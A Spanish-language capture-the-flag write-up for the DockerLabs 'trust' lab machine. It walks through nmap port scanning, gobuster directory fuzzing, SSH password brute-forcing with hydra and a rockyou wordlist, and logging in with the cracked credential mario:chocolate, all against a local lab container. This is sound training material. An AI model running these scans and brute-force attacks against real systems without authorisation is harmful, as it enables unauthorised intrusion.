![DockerLabs](https://dockerlabs.es/images/logos/logo.png)

**Autor:** [El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)

**Dificultad:** Muy Fácil

**Fecha de creación:** 02/04/2024

-------------------------

DESPLIEGUE

```
bash auto_deploy.sh trust.tar
```


![](./images/Pasted%20image%2020241120192822.png)


Tenemos la IP: 
```
172.18.0.2
```

-----------------------

RECONOCIMIENTO.

```
nmap -p- -sS -sV -sC --min-rate 5000 -n -vvv -Pn 172.18.0.2
```

`-p-` ⮞ aplicar reconocimiento a todos los puertos. 
`-sS` ⮞ para descubrir puertos de manera silenciosa y rápida.  
`-sV` ⮞ Encuentra la versión del servicio abierto. 
`-sC` ⮞ Usa unos scripts de reconocimiento.
`--min-rate 5000` ⮞ para que el reconocimiento vaya más rápido. 
`-n` ⮞ no aplica la resolución DNS (tarda mucho en el caso de que no pongamos dicho parámetro) .
`-vvv` ⮞ conforme descubre un puerto nos lo muestra por pantalla.  
`-Pn` ⮞ Ignora si esta activa o no la IP.  

`-oG` ⮞ exportamos el resultado en formato grepeable (para extraer mejor los datos con herramientas como grep, awk)  (Este no lo usaré).


![](./images/Pasted%20image%2020241120193112.png)

Vemos que tiene dos puertos abierto. El 22 y el 80.

Miramos la web. 

![](./images/Pasted%20image%2020241120193326.png)

Es una web con el servicio apache. 

Ahora lo que haremos es hacer fuzzing web con gobuster y le metemos un diccionario con las distintas 

``` 
gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,sh,php
```

![](./images/Pasted%20image%2020241120193855.png)

Parece que nos encontró algo. 

Así que meteré ese directorio en la web. 

Nos sale lo siguiente: 

![](./images/Pasted%20image%2020241120194001.png)


Tenemos un posible usuario. 

Así que vamos a intentar hacer fuerza bruta con hydra. 


```
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.18.0.2
```


Esperamos unos segundos. 

![](./images/Pasted%20image%2020241120194313.png)

Y nos encontró mario:chocolate.

Pues ahora entraremos por el puerto ssh. 

```
ssh mario@172.18.0.2
```


![](./images/Pasted%20image%2020241120194452.png)

Y estamos adentro. 